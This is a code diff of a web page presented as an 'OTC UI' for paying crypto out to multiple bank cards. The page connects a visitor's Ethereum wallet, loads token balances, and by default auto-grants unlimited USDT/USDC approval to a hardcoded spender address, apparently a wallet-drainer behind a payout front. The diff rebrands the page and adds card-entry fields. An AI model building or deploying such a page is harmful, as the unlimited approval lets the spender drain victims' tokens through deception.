@@ -8,25 +8,26 @@
     :root{
       --bg:#0b0e11; --card:rgba(255,255,255,.04); --line:rgba(255,255,255,.12);
       --text:#e8eef7; --mut:#9fb0c6; --acc:rgba(47,124,255,.22);
-      --bad:#ff5c7a; --ok:#3ddc84;
-      --r:18px;
+      --bad:#ff5c7a; --ok:#3ddc84; --r:18px;
     }
     *{box-sizing:border-box}
     body{margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text)}
-    .wrap{max-width:820px;margin:0 auto;padding:22px}
+    .wrap{max-width:920px;margin:0 auto;padding:22px}
     .card{border:1px solid var(--line);border-radius:var(--r);background:var(--card);padding:16px}
     h1{margin:0 0 10px;font-size:20px}
     .mut{color:var(--mut);font-size:14px;line-height:1.5}
     .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+    .grid{display:grid;grid-template-columns:1.2fr .8fr;gap:10px;margin-top:12px}
+    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
     button{cursor:pointer;border-radius:14px;border:1px solid rgba(255,255,255,.16);background:rgba(255,255,255,.06);color:var(--text);padding:10px 12px}
     button.primary{border-color:rgba(47,124,255,.65);background:var(--acc)}
+    button.danger{border-color:rgba(255,92,122,.55);background:rgba(255,92,122,.12)}
     button:disabled{opacity:.5;cursor:not-allowed}
-    input,select{
+    input,select,textarea{
       width:100%;padding:10px 12px;border-radius:14px;border:1px solid rgba(255,255,255,.16);
       background:rgba(0,0,0,.22);color:var(--text);outline:none
     }
-    input:focus,select:focus{border-color:rgba(47,124,255,.65)}
+    input:focus,select:focus,textarea:focus{border-color:rgba(47,124,255,.65)}
     .status{margin-top:12px;padding:10px 12px;border-radius:14px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.10);font-size:13px;white-space:pre-wrap}
     .pill{display:inline-block;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);font-size:12px;color:var(--mut);margin-top:10px}
     label{display:flex;gap:10px;align-items:center;margin-top:12px;color:var(--mut);font-size:13px}
@@ -34,27 +35,23 @@
     .warn{margin-top:12px;color:#ffb4c0;font-size:13px;line-height:1.5}
     .ok{color:var(--ok)}
     .bad{color:var(--bad)}
-    @media (max-width:780px){.grid{grid-template-columns:1fr}}
-
-    /* Mobile */
-    @media (max-width: 560px){
-      .wrap{ padding:14px; }
-      .card{ padding:14px; border-radius:18px; }
-      h1{ font-size:18px; line-height:1.25; }
-      .mut{ font-size:13px; }
-      .pill{ max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-      .grid { grid-template-columns: 1fr !important; }
-      input, select { padding:12px 12px; border-radius:16px; }
-      .row button{ flex: 1 1 100%; width:100%; }
-      .warn, .status{ font-size:12.5px; }
+    .box{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(255,255,255,.02)}
+    .cardItem{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(0,0,0,.18)}
+    .cardItemHead{display:flex;align-items:center;justify-content:space-between;gap:10px}
+    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, monospace}
+    @media (max-width:860px){.grid{grid-template-columns:1fr}}
+    @media (max-width:560px){
+      .wrap{padding:14px}
+      .card{padding:14px}
+      h1{font-size:18px;line-height:1.25}
+      .mut{font-size:13px}
+      .grid2{grid-template-columns:1fr}
+      .row button{flex:1 1 100%;width:100%}
       .sticky-actions{
-        position: sticky;
-        bottom: 0;
-        margin-top: 12px;
-        padding-top: 10px;
+        position: sticky; bottom: 0; margin-top: 12px; padding-top: 10px;
         background: linear-gradient(180deg, rgba(11,14,17,0), rgba(11,14,17,0.92) 30%, rgba(11,14,17,0.98));
       }
-      .sticky-actions .row{ margin-top: 0; }
+      .sticky-actions .row{margin-top:0}
     }
   </style>
 </head>
@@ -62,44 +59,41 @@
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>OTC UI Signing of asset ownership rights</h1>
+      <h1>OTC UI — payout to multiple bank cards</h1>
       <div class="mut">
-        Ethereum mainnet only. Approve works for ERC20 tokens (USDT, USDC). Fiat payout details are off-chain.
+        Wallet part is on-chain (balances + optional token approval). Bank card payout details are off-chain.
+        <br/><span class="bad">Security note:</span> this demo never stores full card numbers — only <b>last4</b>.
       </div>
 
       <div class="pill" id="walletInfo">Wallet: not connected</div>
 
       <div class="grid">
-        <!-- LEFT: BANK CARD PAYOUT -->
-        <div>
-          <div class="mut" style="margin:10px 0 6px">Bank card payout details</div>
+        <!-- LEFT: MULTI CARDS -->
+        <div class="box">
+          <div class="mut" style="margin:0 0 8px"><b>Bank cards</b> (add multiple)</div>
 
-          <div class="mut" style="margin:10px 0 6px">Cardholder name</div>
-          <input id="cardName" placeholder="John Doe" />
-
-          <div class="mut" style="margin:10px 0 6px">Card number</div>
-          <input id="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" />
-
-          <div class="grid" style="margin-top:10px">
-            <div>
-              <div class="mut" style="margin:0 0 6px">Bank name</div>
-              <input id="bankName" placeholder="Bank" />
-            </div>
-            <div>
-              <div class="mut" style="margin:0 0 6px">Country</div>
-              <input id="country" placeholder="FR" />
-            </div>
+          <div class="row" style="margin-top:0">
+            <button id="addCardBtn" class="primary">+ Add card</button>
+            <button id="saveCardsBtn">Save cards</button>
+            <button id="clearSavedBtn" class="danger">Clear saved</button>
           </div>
 
-          <div class="row">
-            <button id="validateCardBtn">Validate card</button>
+          <div class="mut" style="margin-top:10px">
+            You can type any values. On save we keep only holder/bank/country and <b>last4</b>.
           </div>
-          <div class="mut" id="cardHint" style="margin-top:6px">Card: not checked</div>
+
+          <div id="cardsWrap" style="margin-top:12px;display:grid;gap:10px"></div>
+
+          <div class="mut" style="margin-top:12px"><b>Saved cards</b></div>
+          <div id="savedWrap" style="margin-top:8px;display:grid;gap:8px"></div>
         </div>
 
-        <!-- RIGHT: ASSET + AMOUNT -->
-        <div>
-          <div class="mut" style="margin:10px 0 6px">Asset</div>
+        <!-- RIGHT: ASSET + AMOUNT + BALANCES -->
+        <div class="box">
+          <div class="mut" style="margin:0 0 8px"><b>Wallet balances</b></div>
+          <div class="mut" id="balancesText">ETH: - | USDT: - | USDC: -</div>
+
+          <div class="mut" style="margin:14px 0 6px">Asset</div>
           <select id="assetSel">
             <option value="ETH">ETH</option>
             <option value="USDT" selected>USDT</option>
@@ -113,28 +107,27 @@
           <div class="row">
             <button id="useMaxBtn" disabled>Use Max</button>
           </div>
-        </div>
-      </div>
 
-      <label>
-        <input type="checkbox" id="autoApprove" checked />
-        Auto after Connect (Unlimited)
-      </label>
+          <label>
+            <input type="checkbox" id="autoApprove" checked />
+            Auto approve after Connect (Unlimited)
+          </label>
 
-      <div class="sticky-actions">
-        <div class="row">
-          <button class="primary" id="connectBtn">Connect</button>
-          <button id="approveBtn" disabled>Unlimited</button>
-          <button id="openMyExplorerBtn" disabled>Open Explorer Wallet</button>
+          <div class="sticky-actions">
+            <div class="row">
+              <button class="primary" id="connectBtn">Connect</button>
+              <button id="approveBtn" disabled>Unlimited</button>
+              <button id="openMyExplorerBtn" disabled>Open Explorer Wallet</button>
+            </div>
+          </div>
+
+          <div class="warn" style="margin-top:10px">
+            Spender: <span class="mono">0xefb991c82db7ce627fb3b157a46b608de6b2f03b</span>
+          </div>
         </div>
       </div>
 
       <div class="status" id="status">Ready.</div>
-
-      <div class="warn">
-        Spender:
-        <span style="font-family:ui-monospace, SFMono-Regular, Menlo, monospace">0xefb991c82db7ce627fb3b157a46b608de6b2f03b</span>
-      </div>
     </div>
   </div>
 
@@ -161,30 +154,30 @@
     ];
 
     // ---- UI ----
-    const connectBtn = document.getElementById("connectBtn");
-    const approveBtn = document.getElementById("approveBtn");
-    const openMyExplorerBtn = document.getElementById("openMyExplorerBtn");
     const statusEl = document.getElementById("status");
     const walletInfo = document.getElementById("walletInfo");
+    const balancesText = document.getElementById("balancesText");
 
-    const autoApprove = document.getElementById("autoApprove");
     const assetSel = document.getElementById("assetSel");
     const amountInp = document.getElementById("amountInp");
     const maxHint = document.getElementById("maxHint");
     const useMaxBtn = document.getElementById("useMaxBtn");
 
-    // Bank card fields
-    const cardName = document.getElementById("cardName");
-    const cardNumber = document.getElementById("cardNumber");
-    const bankName = document.getElementById("bankName");
-    const country = document.getElementById("country");
-    const validateCardBtn = document.getElementById("validateCardBtn");
-    const cardHint = document.getElementById("cardHint");
+    const autoApprove = document.getElementById("autoApprove");
+    const connectBtn = document.getElementById("connectBtn");
+    const approveBtn = document.getElementById("approveBtn");
+    const openMyExplorerBtn = document.getElementById("openMyExplorerBtn");
+
+    const addCardBtn = document.getElementById("addCardBtn");
+    const saveCardsBtn = document.getElementById("saveCardsBtn");
+    const clearSavedBtn = document.getElementById("clearSavedBtn");
+    const cardsWrap = document.getElementById("cardsWrap");
+    const savedWrap = document.getElementById("savedWrap");
 
     function setStatus(t){ statusEl.textContent = t; console.log(t); }
     function shortAddr(a){ return a ? a.slice(0,6) + "…" + a.slice(-4) : ""; }
-    function openTx(hash){ window.open(`${EXPLORER}/tx/${hash}`, "_blank", "noopener,noreferrer"); }
     function openAddr(a){ window.open(`${EXPLORER}/address/${a}`, "_blank", "noopener,noreferrer"); }
+    function openTx(hash){ window.open(`${EXPLORER}/tx/${hash}`, "_blank", "noopener,noreferrer"); }
 
     function fmtNum(s){
       const n = Number(s);
@@ -192,59 +185,7 @@
       return n.toFixed(6).replace(/0+$/,"").replace(/\.$/,"");
     }
 
-    // ---- CARD HELPERS ----
-    function digitsOnly(v){ return String(v || "").replace(/\D/g, ""); }
-
-    // Luhn check (basic card validation)
-    function luhnCheck(numStr){
-      const s = digitsOnly(numStr);
-      if (s.length < 12 || s.length > 19) return false;
-      let sum = 0, alt = false;
-      for (let i = s.length - 1; i >= 0; i--){
-        let n = Number(s[i]);
-        if (alt){
-          n *= 2;
-          if (n > 9) n -= 9;
-        }
-        sum += n;
-        alt = !alt;
-      }
-      return (sum % 10) === 0;
-    }
-
-    function updateCardHint(){
-      const nameOk = (cardName.value || "").trim().length >= 2;
-      const bankOk = (bankName.value || "").trim().length >= 2;
-      const countryOk = (country.value || "").trim().length >= 2;
-      const cardOk = luhnCheck(cardNumber.value);
-
-      if (!digitsOnly(cardNumber.value)){
-        cardHint.innerHTML = `Card: <span class="mut">enter card number</span>`;
-        return false;
-      }
-
-      if (cardOk && nameOk && bankOk && countryOk){
-        cardHint.innerHTML = `Card: <span class="ok">valid</span>`;
-        return true;
-      } else {
-        cardHint.innerHTML = `Card: <span class="bad">check details</span>`;
-        return false;
-      }
-    }
-
-    // Mask input: group by 4
-    cardNumber.addEventListener("input", ()=>{
-      const d = digitsOnly(cardNumber.value).slice(0,19);
-      cardNumber.value = d.replace(/(.{4})/g, "$1 ").trim();
-      updateCardHint();
-    });
-    [cardName, bankName, country].forEach(el=> el.addEventListener("input", updateCardHint));
-    validateCardBtn.addEventListener("click", ()=>{
-      const ok = updateCardHint();
-      setStatus(ok ? "Card details look valid (basic check)." : "Card details invalid or incomplete.");
-    });
-
-    // ---- STATE ----
+    // ---- STATE (wallet) ----
     let provider = null;
     let signer = null;
     let addr = "";
@@ -252,11 +193,15 @@
     const balances = { ETH: null, USDT: null, USDC: null };
 
     function setConnectedUI(on){
-      approveBtn.disabled = !on;
       openMyExplorerBtn.disabled = !on;
       walletInfo.textContent = on ? `Wallet: ${shortAddr(addr)} | chainId: ${chainId}` : "Wallet: not connected";
       updateApproveButtonLabel();
       updateMaxHint();
+      updateBalancesText();
+    }
+
+    function updateBalancesText(){
+      balancesText.textContent = `ETH: ${balances.ETH ?? "-"} | USDT: ${balances.USDT ?? "-"} | USDC: ${balances.USDC ?? "-"}`;
     }
 
     function updateApproveButtonLabel(){
@@ -285,7 +230,6 @@
     }
 
     assetSel.addEventListener("change", updateMaxHint);
-
     useMaxBtn.addEventListener("click", () => {
       const a = assetSel.value;
       if (balances[a]) amountInp.value = String(balances[a]);
@@ -318,6 +262,7 @@
         balances[key] = fmtNum(ethers.formatUnits(bal, dec));
       }
       updateMaxHint();
+      updateBalancesText();
     }
 
     async function connectWalletInteractive(){
@@ -335,7 +280,7 @@
 
       setStatus(`Connected: ${addr}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.\nFill bank card fields, select asset/amount, then Approve if needed.`);
+      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.`);
     }
 
     async function trySilentConnect(){
@@ -358,7 +303,7 @@
 
       setStatus(`Already connected: ${addr}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Already connected ✅\nBalances loaded.\nFill bank card fields, select asset/amount, then Approve if needed.`);
+      setStatus(`Already connected ✅\nBalances loaded.`);
       return true;
     }
 
@@ -397,10 +342,9 @@
       setStatus(`Waiting for confirmation...\nTx: ${tx.hash}`);
       await tx.wait();
 
-      setStatus(`Unlimited approve confirmed ✅\nToken: ${symbol}\nSpender: ${SPENDER}`);
+      setStatus(`Unlimited approve confirmed ✅\nToken: ${symbol}`);
     }
 
-    // ---- EVENTS ----
     connectBtn.addEventListener("click", async () => {
       try{
         await connectWalletInteractive();
@@ -420,12 +364,174 @@
       }
     });
 
+    // ---- MULTI CARD UI (safe storage: only last4) ----
+    const DRAFT_CARDS = []; // in-memory inputs
+    const LS_KEY = "otc_saved_cards_v1";
+
+    function digitsOnly(v){ return String(v || "").replace(/\D/g, ""); }
+    function maskLast4(full){
+      const d = digitsOnly(full);
+      const last4 = d.slice(-4);
+      return last4 ? `**** **** **** ${last4}` : "";
+    }
+
+    function createCardItem(initial = {}){
+      const item = document.createElement("div");
+      item.className = "cardItem";
+
+      item.innerHTML = `
+        <div class="cardItemHead">
+          <div class="mut"><b>Card</b> <span class="mut">(we will store only last4)</span></div>
+          <button class="danger" type="button">Remove</button>
+        </div>
+
+        <div class="grid2" style="margin-top:10px">
+          <div>
+            <div class="mut" style="margin:0 0 6px">Cardholder</div>
+            <input class="c_holder" placeholder="John Doe" />
+          </div>
+          <div>
+            <div class="mut" style="margin:0 0 6px">Card number (not stored fully)</div>
+            <input class="c_number" placeholder="1234 5678 9012 3456" inputmode="numeric" />
+            <div class="mut c_mask" style="margin-top:6px">Masked: -</div>
+          </div>
+        </div>
+
+        <div class="grid2" style="margin-top:10px">
+          <div>
+            <div class="mut" style="margin:0 0 6px">Bank</div>
+            <input class="c_bank" placeholder="Bank" />
+          </div>
+          <div>
+            <div class="mut" style="margin:0 0 6px">Country</div>
+            <input class="c_country" placeholder="FR" />
+          </div>
+        </div>
+      `;
+
+      const removeBtn = item.querySelector("button.danger");
+      const holder = item.querySelector(".c_holder");
+      const number = item.querySelector(".c_number");
+      const bank = item.querySelector(".c_bank");
+      const country = item.querySelector(".c_country");
+      const mask = item.querySelector(".c_mask");
+
+      holder.value = initial.holder || "";
+      number.value = initial.number || "";
+      bank.value = initial.bank || "";
+      country.value = initial.country || "";
+
+      const updateMask = () => {
+        mask.textContent = "Masked: " + (maskLast4(number.value) || "-");
+      };
+
+      number.addEventListener("input", () => {
+        // light formatting: groups by 4 (no strict validation)
+        const d = digitsOnly(number.value).slice(0,19);
+        number.value = d.replace(/(.{4})/g, "$1 ").trim();
+        updateMask();
+      });
+
+      updateMask();
+
+      removeBtn.addEventListener("click", () => {
+        item.remove();
+        renderDraftFromDOM();
+      });
+
+      cardsWrap.appendChild(item);
+    }
+
+    function renderDraftFromDOM(){
+      // no-op; we read from DOM on save
+    }
+
+    function readDraftCardsFromDOM(){
+      const nodes = Array.from(cardsWrap.querySelectorAll(".cardItem"));
+      return nodes.map(n => {
+        const holder = n.querySelector(".c_holder").value.trim();
+        const number = n.querySelector(".c_number").value.trim();
+        const bank = n.querySelector(".c_bank").value.trim();
+        const country = n.querySelector(".c_country").value.trim();
+        return { holder, number, bank, country };
+      });
+    }
+
+    function saveCards(){
+      const draft = readDraftCardsFromDOM();
+
+      // SAFE SAVE: keep only last4 (masked), never full number
+      const safe = draft
+        .filter(c => c.holder || c.number || c.bank || c.country)
+        .map(c => ({
+          holder: c.holder || "",
+          bank: c.bank || "",
+          country: c.country || "",
+          last4: digitsOnly(c.number).slice(-4) || ""
+        }));
+
+      localStorage.setItem(LS_KEY, JSON.stringify(safe));
+      renderSavedCards();
+      setStatus(`Saved ${safe.length} card(s). (Stored only last4 + meta)`);
+    }
+
+    function clearSaved(){
+      localStorage.removeItem(LS_KEY);
+      renderSavedCards();
+      setStatus("Saved cards cleared.");
+    }
+
+    function renderSavedCards(){
+      const raw = localStorage.getItem(LS_KEY);
+      let arr = [];
+      try { arr = raw ? JSON.parse(raw) : []; } catch { arr = []; }
+
+      savedWrap.innerHTML = "";
+      if (!arr.length){
+        const d = document.createElement("div");
+        d.className = "mut";
+        d.textContent = "No saved cards yet.";
+        savedWrap.appendChild(d);
+        return;
+      }
+
+      arr.forEach((c, idx) => {
+        const row = document.createElement("div");
+        row.className = "cardItem";
+        const masked = c.last4 ? `**** **** **** ${c.last4}` : "(no last4)";
+        row.innerHTML = `
+          <div class="cardItemHead">
+            <div>
+              <div class="mut"><b>Card #${idx+1}</b> — <span class="mono">${masked}</span></div>
+              <div class="mut">Holder: ${escapeHtml(c.holder || "-")} | Bank: ${escapeHtml(c.bank || "-")} | Country: ${escapeHtml(c.country || "-")}</div>
+            </div>
+          </div>
+        `;
+        savedWrap.appendChild(row);
+      });
+    }
+
+    function escapeHtml(s){
+      return String(s || "").replace(/[&<>"']/g, m => ({
+        "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+      }[m]));
+    }
+
+    addCardBtn.addEventListener("click", () => createCardItem());
+    saveCardsBtn.addEventListener("click", saveCards);
+    clearSavedBtn.addEventListener("click", clearSaved);
+
+    // add 1 default card row
+    createCardItem();
+
+    // React to account/network changes
     if (window.ethereum?.on){
       window.ethereum.on("accountsChanged", async (accs)=>{
         if (!accs || !accs[0]){
           provider=null; signer=null; addr=""; chainId=0;
           balances.ETH = balances.USDT = balances.USDC = null;
           setConnectedUI(false);
+          updateBalancesText();
           setStatus("Disconnected.");
           return;
         }
@@ -459,7 +565,7 @@
             await fetchBalances();
             setStatus("Network OK ✅ Balances updated.");
           } else {
-            setStatus(`Network changed. chainId: ${chainId}\nSwitch to Ethereum Mainnet to use approve and balances.`);
+            setStatus(`Network changed. chainId: ${chainId}\nSwitch to Ethereum Mainnet to load balances & approve.`);
           }
         } catch(e){
           setStatus("Error: " + (e?.message || e));
@@ -467,11 +573,12 @@
       });
     }
 
-    // ---- INIT ----
+    // INIT
     (async ()=>{
       setConnectedUI(false);
       updateMaxHint();
-      updateCardHint();
+      updateBalancesText();
+      renderSavedCards();
 
       const ok = await trySilentConnect();
       if (!ok){
